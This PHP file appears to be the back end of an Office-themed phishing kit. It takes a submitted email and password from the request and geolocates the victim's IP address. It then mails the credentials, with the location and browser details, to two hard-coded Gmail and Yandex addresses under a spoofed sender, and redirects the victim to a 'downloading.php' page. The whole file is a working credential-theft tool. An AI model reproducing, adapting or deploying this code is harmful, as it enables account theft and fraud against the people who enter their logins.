<?php

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];
$port = getenv("REMOTE_PORT");

$bilsmg .= "------------------[ Offce Reslts ]--------------<br>\n";
$bilsmg .= "|Email : ".$_GET['u']."\n";
$bilsmg .= "|Password : ".$_GET['p']."\n";
$bilsmg .= "------------------[INFOS]------------------\n";
$bilsmg .= "Country: '$country' | State: '$state' | City: '$city' | 'Port : $port'\n";
$bilsmg .= "USER-WEB-BROWSER: '$browser'\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "fletcher7924@gmail.com,fletcher7924@yandex.com";
$bilsub = "Offce | From $state";
$bilhead = "From: Drivers LLC<Gba>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="downloading.php";
header("location:$src");
?>